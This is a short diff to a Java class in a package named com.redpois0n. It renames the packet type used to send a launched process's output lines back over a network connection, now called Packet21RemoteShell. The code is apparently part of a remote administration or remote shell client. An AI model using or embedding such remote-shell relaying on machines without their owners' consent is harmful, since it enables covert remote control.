@@ -3,8 +3,7 @@ package com.redpois0n;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
-import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.outgoing.Packet21RemoteShell;
 
 public class LaunchProcess extends Thread {
 
@@ -25,13 +24,13 @@ public class LaunchProcess extends Thread {
 			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
 			while ((line = input.readLine()) != null) {
 				if (!line.trim().equals("")) {
-					Connection.addToSendQueue(new PacketBuilder(Header.COMMAND_PROMPT, line));
+					Connection.addToSendQueue(new Packet21RemoteShell(line));
 				}
 			}
 			input.close();
 			latest = null;
 		} catch (Exception ex) {
-			Connection.addToSendQueue(new PacketBuilder(Header.COMMAND_PROMPT, "Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
+			Connection.addToSendQueue(new Packet21RemoteShell("Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 			latest = null;
 		}
 	}
